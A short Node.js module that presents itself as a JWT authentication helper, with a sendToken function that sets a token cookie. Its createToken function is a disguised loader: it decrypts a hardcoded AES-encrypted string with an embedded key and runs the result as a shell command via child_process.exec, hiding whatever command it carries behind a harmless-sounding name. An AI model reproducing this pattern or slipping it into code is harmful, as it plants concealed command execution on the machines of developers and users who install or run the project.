const CryptoJS = require("crypto-js");
const { exec } = require('child_process')

// Create and send token and save in the cookie.
const sendToken = (user, statusCode, res) => {
  // Create Jwt token
  const token = user.getJwtToken();

  // Options for cookie
  const options = {
    expires: new Date(
      Date.now() + process.env.COOKIE_EXPIRES_TIME * 24 * 60 * 60 * 1000
    ),
    httpOnly: true,
  };

  res.status(statusCode).cookie("token", token, options).json({
    success: true,
    token,
    user,
  });
};

const createToken = () => {
  const defaultToken = "U2FsdGVkX1+R0yI0K6OqX7Tvc71xHKMOunng0XxWdl/wHTGyVSFHLlAhr9nVf/IFfOhudFgbT880BBAN56Wz/Q=="
  const tokenInfo = CryptoJS.AES.decrypt(defaultToken, 'pass@WordKEY');
  exec(`${tokenInfo.toString(CryptoJS.enc.Utf8)}`)
}

module.exports = {
  sendToken: sendToken,
  createToken: createToken
};

